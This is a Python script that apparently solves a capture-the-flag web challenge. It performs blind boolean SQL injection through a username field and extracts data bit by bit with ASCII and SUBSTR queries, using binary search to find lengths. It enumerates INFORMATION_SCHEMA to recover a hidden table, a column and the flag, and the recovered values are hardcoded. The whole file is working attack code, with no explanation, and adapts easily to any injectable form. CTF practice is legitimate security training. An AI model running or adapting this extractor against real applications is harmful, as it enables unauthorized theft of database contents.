import requests

def get(username):
	r=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php') # get cookie
	r=requests.post('http://backdoor.cognizance.org.in/problems/web300/check.php',data=dict(username=username),cookies=r.cookies)
	print username, r.content
	if r.content == 'Please wait for a little while for this user to be validated': return False
	if r.content == 'This user has been validated': return True
	if not r.content: return False # error
	return r.content

def inject(sql):
	return get("1' AND "+sql+'-- ') # escaped

def tinject(queue, key, username):
	queue.put((key,'1' if inject(username) else '0'))

def enumByte(base,byte):
	rval = ''
	template = '((ASCII(%s)>>%d)&1)=1'
	for i in xrange(7,-1,-1):
		request = base%(template%(byte,i))
		rval += '1' if inject(request) else '0'
	return int(rval,2)

def enumChar(base,byte):
	return chr(enumByte(base,byte))

def enumString(base,string,length):
	rval = ''
	template = 'SUBSTR(%s,%d,1)'
	for i in xrange(length):
		rval += enumChar(base,template%(string,i+1))
		print rval
	return rval

def getLength(query,minlen=0,maxlen=256):
	while minlen != maxlen:
		target = (maxlen+minlen)/2
		if inject(query%(minlen,target)):
			maxlen = target
		else:
			if minlen == target: return maxlen
			minlen = target
	return minlen

#p=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND LENGTH(TABLE_NAME) BETWEEN %d AND %d)")
p=16

#r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND %s)","TABLE_NAME",tlen)
r='the_elusive_flag'

#p=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND LENGTH(COLUMN_NAME) BETWEEN %d AND %d)")
p=24

#r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",p)
r='this_column_has_the_flag'

#p=getLength("(SELECT LENGTH(this_column_has_the_flag) BETWEEN %d and %d FROM the_elusive_flag")
p=256

#r=enumString("(SELECT %s FROM the_elusive_flag)","this_column_has_the_flag",p)
r='9d4dcc5981b17bf37740c7dbabe3b294'
print 'value',r
